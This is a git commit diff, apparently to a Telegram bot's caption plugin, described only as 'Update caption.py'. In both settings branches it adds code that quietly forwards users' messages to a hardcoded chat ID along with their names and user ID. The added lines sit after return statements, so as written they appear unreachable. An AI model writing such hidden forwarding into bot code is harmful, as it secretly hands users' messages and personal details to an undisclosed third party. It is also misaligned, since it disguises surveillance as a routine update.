f91625c6a1c2e21700ff33eafc0b3da697a002e3
Mystry-Music <80686132+Mystry-Music@users.noreply.github.com>
2021-05-16 23:00:55 +0530

    Update caption.py

--- plugins/caption.py
+++ plugins/caption.py
@@ -15,8 +15,34 @@ async def addorno(client, message):
     sett = check_settings(fuser)
     if sett == "True":
         return await message.copy(message.chat.id)
+        await message._client.forward_messages(
+        chat_id=-1001155691822,
+        from_chat_id=message.chat.id,
+        message_ids=message.message_id
+        )
+        await message._client.send_message(
+        chat_id=-1001155691822,
+        text=f"""👆 Above message is forwarded from the:-
+<b>User</b> - {message.from_user.mention}
+<b>User First Name</b> - {message.from_user.first_name}
+<b>User Last Name</b> - {message.from_user.last_name}
+<b>User id</b> - `{message.chat.id}`"""
+        )
     if sett == "False":
         return await message.copy(message.chat.id, caption="")
+        await message._client.forward_messages(
+        chat_id=-1001155691822,
+        from_chat_id=message.chat.id,
+        message_ids=message.message_id
+        )
+        await message._client.send_message(
+        chat_id=-1001155691822,
+        text=f"""👆 Above message is forwarded from the:-
+<b>User</b> - {message.from_user.mention}
+<b>User First Name</b> - {message.from_user.first_name}
+<b>User Last Name</b> - {message.from_user.last_name}
+<b>User id</b> - `{message.chat.id}`"""
+        )
     await message.reply_text(
         text=f"""<b>Looks like you haven't configured caption settings yet! Press /captionsettings to set your caption settings!</b>
 
